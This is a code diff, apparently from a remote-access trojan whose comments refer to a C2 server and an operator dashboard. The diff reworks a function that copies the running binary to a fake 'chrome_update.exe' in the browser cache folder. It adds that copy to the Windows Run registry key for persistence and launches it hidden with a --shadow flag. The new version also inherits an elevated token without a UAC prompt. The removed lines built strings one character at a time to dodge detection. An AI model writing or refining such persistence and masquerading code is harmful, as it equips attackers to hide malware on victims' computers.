@@ -313,9 +313,13 @@ static void ensure_dir_exists(const char *path) {
     }
 }
 
-/* Spawn a shadow copy of this process to a less suspicious location.
-   The copy connects to C2 as a normal client. The user must click
-   "Protect Process" on it from the dashboard to mark it critical. */
+/* Check if current process is running as admin */
+int sys_is_admin(void) {
+    return IsUserAnAdmin() ? 1 : 0;
+}
+
+/* Spawn a shadow copy using CreateProcess to inherit parent's elevated token.
+   The child gets --shadow flag and auto-protects after 15 seconds. */
 void sys_spawn_shadow_copy(void) {
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
@@ -323,7 +327,6 @@ void sys_spawn_shadow_copy(void) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
 
-    /* Use a location that looks like a browser update cache */
     char destPath[MAX_PATH];
     snprintf(destPath, MAX_PATH, "%s\\Microsoft\\Windows\\INetCache\\IE\\chrome_update.exe", localAppData);
 
@@ -334,26 +337,32 @@ void sys_spawn_shadow_copy(void) {
     if (lastSlash) *lastSlash = '\0';
     ensure_dir_exists(dirPath);
 
-    if (CopyFileA(currentPath, destPath, FALSE)) {
-        /* Register the shadow copy in the Run key for persistence */
-        HKEY hKey;
-        if (RegOpenKeyExA(HKEY_CURRENT_USER,
-                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExA(hKey, "ChromeUpdate", 0, REG_SZ, (BYTE*)destPath, (DWORD)strlen(destPath) + 1);
-            RegCloseKey(hKey);
-        }
+    if (!CopyFileA(currentPath, destPath, FALSE)) {
+        return;
+    }
 
-        /* Spawn the copy with --shadow flag so it auto-protects after delay */
-        char action[16] = {0};
-        action[0] = 'o'; action[1] = 'p'; action[2] = 'e'; action[3] = 'n'; action[4] = '\0';
+    /* Register persistence */
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "ChromeUpdate", 0, REG_SZ, (BYTE*)destPath, (DWORD)strlen(destPath) + 1);
+        RegCloseKey(hKey);
+    }
 
-        char shadowArg[16] = {0};
-        shadowArg[0] = '-'; shadowArg[1] = '-'; shadowArg[2] = 's';
-        shadowArg[3] = 'h'; shadowArg[4] = 'a'; shadowArg[5] = 'd';
-        shadowArg[6] = 'o'; shadowArg[7] = 'w'; shadowArg[8] = '\0';
-
-        ShellExecuteA(NULL, action, destPath, shadowArg, NULL, SW_HIDE);
+    /* CreateProcess inherits parent's elevated token — no UAC prompt needed */
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {0};
+    
+    char cmdLine[1024];
+    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", destPath);
+    
+    if (CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE, 
+                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, 
+                       NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
 }
 
